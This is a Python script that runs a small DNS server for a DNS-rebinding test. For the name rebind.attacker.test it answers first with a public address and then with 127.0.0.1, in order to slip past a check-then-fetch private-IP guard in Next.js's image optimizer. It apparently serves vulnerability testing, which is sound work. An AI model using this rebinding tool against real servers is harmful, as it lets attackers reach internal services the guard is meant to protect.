#!/usr/bin/env python3
"""
Minimal authoritative-ish DNS responder for a DNS-rebinding test.

Answers A queries for the configured name with a PUBLIC address the first N
times, then flips to 127.0.0.1. TTL 0 so nothing caches.

Next.js's image optimizer checks the host with dns.lookup() and then calls
fetch(), which resolves again. If the two resolutions can disagree, the
private-IP guard is a TOCTOU check.
"""
import socket
import struct
import sys
import threading
import time

NAME = b"rebind.attacker.test"
PUBLIC_IP = "93.184.216.34"
PRIVATE_IP = "127.0.0.1"
FLIP_AFTER = 1  # first answer public, then private

count_lock = threading.Lock()
counter = {"n": 0}
log = []


def encode_name(name: bytes) -> bytes:
    out = b""
    for part in name.split(b"."):
        out += bytes([len(part)]) + part
    return out + b"\x00"


def parse_question(data: bytes):
    idx = 12
    labels = []
    while True:
        ln = data[idx]
        if ln == 0:
            idx += 1
            break
        labels.append(data[idx + 1: idx + 1 + ln])
        idx += 1 + ln
    qtype, qclass = struct.unpack(">HH", data[idx:idx + 4])
    return b".".join(labels), qtype, qclass, idx + 4


def build_response(data: bytes, qname: bytes, qend: int, ip: str) -> bytes:
    tid = data[:2]
    flags = b"\x85\x00"          # QR, AA, RD
    counts = struct.pack(">HHHH", 1, 1, 0, 0)
    question = data[12:qend]
    rr = encode_name(qname)
    rr += struct.pack(">HHIH", 1, 1, 0, 4)   # A, IN, TTL 0, len 4
    rr += socket.inet_aton(ip)
    return tid + flags + counts + question + rr


def nxdomain(data: bytes, qend: int) -> bytes:
    tid = data[:2]
    flags = b"\x85\x03"
    counts = struct.pack(">HHHH", 1, 0, 0, 0)
    return tid + flags + counts + data[12:qend]


UPSTREAM = "8.8.8.8"


def forward(data: bytes) -> bytes:
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    u.settimeout(4)
    u.sendto(data, (UPSTREAM, 53))
    resp, _ = u.recvfrom(4096)
    return resp


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5354
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", port))
    print(f"dns listening on 127.0.0.1:{port} for {NAME.decode()}", flush=True)
    while True:
        data, addr = s.recvfrom(2048)
        try:
            qname, qtype, _qclass, qend = parse_question(data)
        except Exception:
            continue
        if qname.lower() != NAME.lower():
            # everything else goes upstream so the container keeps working
            try:
                s.sendto(forward(data), addr)
            except Exception:
                s.sendto(nxdomain(data, qend), addr)
            continue
        if qtype != 1:  # only answer A; AAAA -> empty NOERROR
            tid = data[:2]
            s.sendto(tid + b"\x85\x00" + struct.pack(">HHHH", 1, 0, 0, 0)
                     + data[12:qend], addr)
            continue
        with count_lock:
            # Each burst of queries is one test run: idle for >5s resets the
            # counter so every run starts with a public answer.
            now = time.time()
            if now - counter.get("last", 0) > 5:
                counter["n"] = 0
                print("  -- counter reset (new run) --", flush=True)
            counter["last"] = now
            counter["n"] += 1
            n = counter["n"]
        ip = PUBLIC_IP if n <= FLIP_AFTER else PRIVATE_IP
        log.append((n, ip))
        print(f"  A query #{n} -> {ip}", flush=True)
        s.sendto(build_response(data, qname, qend, ip), addr)


if __name__ == "__main__":
    main()
